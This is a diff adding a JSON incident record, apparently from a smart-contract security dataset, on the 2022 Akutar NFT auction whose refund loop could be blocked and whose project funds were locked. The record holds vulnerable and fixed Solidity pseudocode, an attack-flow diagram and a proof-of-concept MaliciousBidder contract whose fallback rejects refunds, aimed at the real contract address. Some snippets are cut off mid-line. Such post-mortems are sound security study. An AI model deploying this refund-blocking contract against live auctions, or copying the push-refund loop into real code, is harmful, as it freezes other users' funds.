@@ -1,0 +1,34 @@
+{
+ "id": "2022__2022-04-22_AkutarNFT_RefundDoSFundsLocked",
+ "source_file": "2022/2022-04-22_AkutarNFT_RefundDoSFundsLocked.md",
+ "title": "Akutar NFT — DoS Refund Blockage and Permanent Project Fund Lock Analysis",
+ "date": "2022-04-22",
+ "protocol": "Akutar NFT",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$34,000,000 (project funds permanently locked)",
+ "loss_usd": 34000000.0,
+ "root_cause": "1) When the bidder is a contract, a fallback revert during ETH refund can DoS the entire refund process; 2) A logic error in `claimProjectFunds()` require condition permanently prevents project fund withdrawal",
+ "attack_tx": null,
+ "vulnerable_contract": "Akutar NFT 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d",
+ "classes": [
+  "nft"
+ ],
+ "code_before": [
+  "❌ Vulnerable processRefunds() (pseudocode)\ncontract AkutarNFT {\n    struct Bid {\n        address payable bidder;\n        uint256 amount;\n    }\n    Bid[] public bids;\n    uint256 public processed;\n\n    //",
+  "❌ Sends ETH to bidders sequentially — one failure halts everything\n    function processRefunds() external {\n        for (uint256 i = processed; i < bids.length; i++) {\n            Bid memory bid = bids[i];\n            //",
+  "❌ Contract bidder reverts in fallback → entire loop halted\n            (bool success,) = bid.bidder.call{value: bid.amount}(\"\");\n            require(success, \"refund failed\");  // ← entire revert on failure\n            processed++;\n        }\n    }\n\n    //"
+ ],
+ "code_after": [
+  "✅ Correct pattern (Pull-over-Push)\ncontract AkutarNFTFixed {\n    mapping(address => uint256) public pendingRefunds;\n\n    //",
+  "✅ Record balances instead of directly sending refunds\n    function processRefunds() external {\n        for (uint256 i = processed; i < bids.length; i++) {\n            pendingRefunds[bids[i].bidder] += bids[i].amount;\n            processed++;\n        }\n    }\n\n    //"
+ ],
+ "steps": [
+  "require(success) fails → entire function reverts",
+  "require(processed == bids.length) → false",
+  "require(block.timestamp > deadline) → false (deadline not yet passed)"
+ ],
+ "other_code": [
+  "Malicious Contract (ETH-rejecting fallback)\n    │\n    ├─[1] Bids 3.5 ETH in the auction\n    │       Malicious contract address included in bids array\n    │\n    ├─[2] Honest user outbids with 3.75 ETH\n    │       Auction ends\n    │\n    ├─[3] processRefunds() called\n    │       i=0: Attempts to send 3.5 ETH to malicious contract\n    │           ↓\n    │   Malicious contract fallback: revert(\"I reject ETH\")\n    │           ↓\n    │   require(success) fails → entire function reverts\n    │\n    ├─[4] processRefunds() completely blocked\n    │       processed remains 0\n    │       Honest users also cannot receive refunds\n    │\n    ├─[5] claimProjectFunds() call attempted\n    │       require(processed == bids.length) → false\n    │       require(block.timestamp > deadline) → false (deadline not yet pa",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IAkutarNFT {\n    function bid() external payable;\n    function processRefunds() external;\n    function claimProjectFunds() external;\n}\n\n// ⚡ Malicious contract that rejects ETH refunds\ncontract MaliciousBidder {\n    IAkutarNFT akutar;\n\n    constructor(address _akutar) {\n        akutar = IAkutarNFT(_akutar);\n    }\n\n    function attack() external payable {\n        // Place bid in auction (with ETH)\n        akutar.bid{value: msg.value}();\n    }\n\n    // ⚡ Revert in fallback: reject refund ETH\n    receive() external payable {\n        revert(\"I reject your refund!\");\n    }\n}\n\ncontract ContractTest is Test {\n    IAkutarNFT akutar =\n        IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);"
+ ]
+}
